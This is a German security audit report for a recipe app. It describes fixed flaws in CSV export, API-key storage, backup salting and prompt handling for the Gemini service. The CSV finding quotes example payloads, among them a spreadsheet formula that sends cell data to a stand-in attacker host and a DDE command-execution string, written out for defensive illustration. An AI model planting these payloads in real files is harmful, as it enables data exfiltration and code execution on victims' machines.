# Security Audit 2026

Datum: 2026-04-22

## Scope

Geprueft wurden insbesondere diese Bereiche:

- `src/services/db.ts`, `src/services/dbInstance.ts`, `src/services/dbMigrations.ts`
- `src/services/apiKeyService.ts`
- DOM-Rendering von nutzer- oder KI-generierten Texten in React-Komponenten
- `src/services/exportService.ts`
- angrenzend aufgefallen: `src/services/healthConnectService.ts`, `src/services/settingsService.ts`

## Executive Summary

Die App zeigt aktuell keine direkte, kritische DOM-XSS-Senke im regulären React-Rendering. Nutzer- und KI-Texte werden ueberwiegend als normale React-Textknoten gerendert, was HTML standardmaessig escaped. Der HTML-Importpfad fuer Rezepte sanitisiert Fremd-HTML bereits mit DOMPurify und extrahiert anschliessend nur Text.

Es wurden inzwischen fünf reale Sicherheitsluecken bestaetigt und behoben:

1. CSV-/Spreadsheet-Formula-Injection in `exportService.ts`
2. Nur triviale XOR-Obfuskation fuer API-Keys in `apiKeyService.ts`
3. Formula-/CSV-Injection im Health-CSV-Export in `healthConnectService.ts`
4. Statisches PBKDF2-Salt im Backup-/Sync-Format in `syncService.ts`
5. Prompt-Injection- und Strukturvertrauen in `geminiService.ts`

Zusätzlich bestehen weiterhin relevante Restrisiken:

1. Die Local-First-Datenhaltung speichert Fach- und Backup-Daten weiterhin lokal im Klartext in IndexedDB; das ist architekturell erwartbar, aber kein Schutz gegen lokale Geraetekompromittierung oder XSS im selben Origin.
2. CSP ist fuer die Web/PWA-Variante jetzt als Meta-Policy definiert, fuer Tauri oder spaetere Header-basierte Deployments bleibt aber weitere Haertung moeglich.

## Findings

### Hoch: CSV Formula Injection in `exportService.ts` - behoben

Betroffen waren:

- Einzelrezept-CSV-Export
- Einkaufslisten-CSV-Export
- Vollbackup-CSV-Export

Vor dem Fix konnten Felder mit Prefixen wie `=`, `+`, `-` oder `@` ungefiltert in CSV-Dateien gelangen. Beim Oeffnen in Excel, LibreOffice oder Google Sheets haette das zu Formelausfuehrung, externen Requests oder Datenexfiltration fuehren koennen.

Beispielhafte Payloads:

- `=HYPERLINK("https://attacker.tld/?x="&A1)`
- `@SUM(1+1)`
- `-cmd|' /C calc'!A0`

Fix:

- CSV-Zellen werden jetzt vor `Papa.unparse(...)` neutralisiert.
- Gefaehrliche Formula-Prefixe werden mit einem fuehrenden Apostroph entschärft.
- Der Fix deckt sowohl einzelne Exporte als auch kombinierte Voll-Backups ab.

Verifikation:

- `src/services/__tests__/exportService.test.ts`

### Mittel: API-Key nur obfuskiert statt verschluesselt - behoben

`apiKeyService.ts` hat den Gemini-API-Key zuvor nur per XOR mit einem leicht reproduzierbaren Fingerprint obfuskiert. Das war kein belastbarer Schutz gegen:

- denselben Origin nach erfolgreicher XSS
- lokale Auslese der IndexedDB durch Browser- oder Profilzugriff
- triviale Rueckrechnung durch jede mitlaufende JavaScript-Ausfuehrung

Fix:

- Speicherung jetzt per AES-GCM ueber Web Crypto API
- Schluesselableitung via PBKDF2 + zufaelligem Salt
- zufaellige IV pro Schreibvorgang
- Rueckwaertskompatibles Lesen alter XOR-Eintraege mit stiller Re-Migration auf das neue Format

Wichtige Einordnung:

Dieser Fix verbessert den Schutz gegen rohe Datentraeger-/Profil-Auslese deutlich. Er schuetzt aber weiterhin nicht gegen erfolgreiche XSS im selben Origin, da der Browser-Prozess selbst entschluesseln koennen muss.

Verifikation:

- `src/services/__tests__/apiKeyService.test.ts`

### Niedrig: Keine direkte DOM-XSS-Senke im aktuellen UI-Rendering gefunden

Pruefergebnis:

- Kein Einsatz von `dangerouslySetInnerHTML`
- Kein `innerHTML`, `insertAdjacentHTML` oder `srcDoc` im Anwendungs-Code gefunden
- KI- und Nutzertexte werden in React-Komponenten als Textknoten gerendert
- HTML aus Rezept-Importen wird in `recipeImportService.ts` mit DOMPurify sanitisiert und anschliessend nur textuell ausgewertet

Bewertung:

Aktuell kein unmittelbarer XSS-Befund in diesem Bereich.

Rest-Risiko:

- Falls spaeter Markdown-/HTML-Rendering eingefuehrt wird, muss vor dem ersten Release ein expliziter Sanitizer- und Sink-Review erfolgen.

### Hoch: Health-CSV-Export formula-/CSV-injection-anfaellig - behoben

`src/services/healthConnectService.ts` hat Health-CSV-Dateien zuvor manuell per `Array.join(',')` gebaut. Dadurch fehlten:

- Formula-Neutralisierung
- CSV-Quoting fuer Kommata, Anfuehrungszeichen und Zeilenumbrueche

Risiko:

- Formula Injection beim Oeffnen in Spreadsheet-Programmen
- Strukturbruch der CSV-Datei durch Sonderzeichen in `mealName`

Fix:

- Zellen werden jetzt vor dem Schreiben mit demselben Formula-Schutz wie in `exportService.ts` gehaertet.
- Alle Werte werden explizit CSV-quoted und innere Anfuehrungszeichen werden escaped.
- Der Download setzt jetzt `text/csv;charset=utf-8` und `rel="noopener noreferrer"`.

Verifikation:

- `src/services/__tests__/healthConnectService.test.ts`

### Mittel: Statisches PBKDF2-Salt im Sync-/Backup-Format - behoben

`src/services/syncService.ts` hat zuvor jedes verschluesselte Backup mit demselben PBKDF2-Salt (`culinasync-salt`) abgeleitet. Dadurch wurde das Passwort-Hashing fuer alle Exporte auf denselben Salt-Wert fixiert.

Risiko:

- Schwaechung der Passwort-Ableitung durch fehlende Einzigartigkeit pro Backup
- Erleichterte vorberechnete Angriffe auf mehrere Exporte mit demselben Passwort

Fix:

- Neue Backups erhalten jetzt ein zufaelliges Salt pro Export via `crypto.getRandomValues`.
- Das neue Blob-Format fuehrt einen Header ein und speichert Salt und IV explizit vor dem Ciphertext.
- `decryptBackup` bleibt rueckwaertskompatibel und kann alte Exporte mit festem Salt weiterhin lesen.

Verifikation:

- `src/services/__tests__/syncService.test.ts`

### Mittel: Prompt-Injection- und Strukturvertrauen in `geminiService.ts` - behoben

`src/services/geminiService.ts` hat Web-Content fuer Rezeptimporte zuvor nahezu roh per `webContent.slice(...)` an Gemini weitergereicht und mehrere KI-Antworten nach `JSON.parse(...)` nur oberflaechlich validiert.

Risiko:

- Instruktionsartige Fremdinhalte konnten als Prompt-Kontext an das Modell gelangen
- Strukturabweichungen in KI-Antworten konnten zu stillen Datenfehlern oder spaeten Laufzeitfehlern fuehren

Fix:

- Fremder Web-Content wird jetzt vor dem Prompt auf HTML-, Script- und instruktionaehnliche Zeilen reduziert.
- Der Import-Prompt markiert den Inhalt explizit als untrusted data und kapselt ihn zwischen klaren Daten-Grenzen.
- JSON-Antworten fuer Rezeptideen, Rezepte, Einkaufslisten und Nahrwert-Verifikation laufen jetzt durch explizite Runtime-Validatoren statt durch blindes Strukturvertrauen.

Verifikation:

- `src/services/__tests__/geminiService.test.ts`

### Niedrig: Persistenz-Oberflaeche groesser als noetig - teilweise reduziert

Beobachtungen:

- Domänendaten liegen erwartungsgemaess lokal in Dexie/IndexedDB
- Migrations-Backups (`CulinaSyncMigrationBackups`) speichern Snapshots der Primärdatenstores lokal, werden aber jetzt auf eine kleine Anzahl aktueller Eintraege begrenzt
- Settings werden weiterhin in `localStorage` gespeichert, aber jetzt ueber einen konsolidierten Redux-Persist-Pfad statt ueber zwei konkurrierende Schluessel

Risiko:

- vergroesserte lokale Datenflaeche fuer forensische Auslese oder Shared-Device-Szenarien
- kein unmittelbarer Remote-Exploit, aber erhoehter Privacy-Footprint

Empfehlung:

- Aufbewahrungsstrategie fuer Migrations-Backups weiter scharfziehen, falls kuenftig mehr Versionen oder groessere Datensaetze migriert werden
- Privacy-Footprint der verbleibenden lokalen Settings- und Backup-Daten weiter dokumentieren
- klar dokumentieren, welche Daten lokal im Klartext vorliegen

## Code Changes Applied

- `src/services/exportService.ts`: CSV-Zell-Haertung gegen Formula Injection
- `src/services/apiKeyService.ts`: AES-GCM/PBKDF2-basierte Speicherung mit Legacy-Migration
- `src/services/healthConnectService.ts`: sichere CSV-Serialisierung mit Formula-Neutralisierung, Quoting und sichererem Download-Metadatum
- `src/services/syncService.ts`: zufaelliges Salt pro Backup, versioniertes Exportformat und Legacy-Decrypt fuer alte Backups
- `src/services/geminiService.ts`: Web-Content-Haertung gegen Prompt-Injection und Runtime-Validierung fuer KI-JSON-Antworten
- `src/services/settingsService.ts`: bevorzugt `persist:settings` als Source of Truth und faellt nur noch lesend auf Legacy-Daten zurueck
- `src/store/slices/settingsSlice.ts`: entfernt konkurrierende Direkt-Schreibzugriffe nach `culinaSyncSettings`
- `src/services/dbMigrations.ts`: begrenzt Migrations-Backups auf eine kleine Menge aktueller Snapshots
- `index.html`: konservative Meta-CSP fuer Scripts, Styles, Bilder, Connect-Targets, Worker und Medien gesetzt
- `public/404.html`: GitHub-Pages-SPA-Redirect auf same-origin URL-Konstruktion umgestellt
- `src/components/settings/panels/ApiKeyPanel.tsx`: Sicherheitshinweis auf realen Schutzumfang angepasst
- `src/services/__tests__/exportService.test.ts`: neue Sicherheits-Regressionstests
- `src/services/__tests__/apiKeyService.test.ts`: neue Roundtrip- und Migrations-Tests
- `src/services/__tests__/healthConnectService.test.ts`: Regressionstests fuer Formula-Prefixe, Quotes und Zeilenumbrueche in Health-CSV-Exports
- `src/services/__tests__/syncService.test.ts`: Roundtrip-, Random-Salt- und Legacy-Format-Tests fuer Backup-Verschluesselung
- `src/services/__tests__/settingsService.test.ts`: Tests fuer priorisierte Redux-Persist-Ladung und Legacy-Fallback bei Settings
- `src/services/__tests__/geminiService.test.ts`: Tests fuer invalides KI-JSON und sanitisierten Web-Import-Prompt
- `src/services/__tests__/dbMigrations.test.ts`: Test fuer Retention alter Migrations-Backups in IndexedDB

## Recommended Next Steps

1. Die CSP mittelfristig von Meta auf Header-Ebene verlagern und fuer Tauri separat scharfziehen.
2. Langfristig pruefen, ob ein nutzerseitiges Secret/Passphrase-Modell fuer besonders schutzbeduerftige lokale Daten sinnvoll ist.
3. Retention und Sichtbarkeit lokaler Backup-/Settings-Daten weiter absichern und dokumentieren.
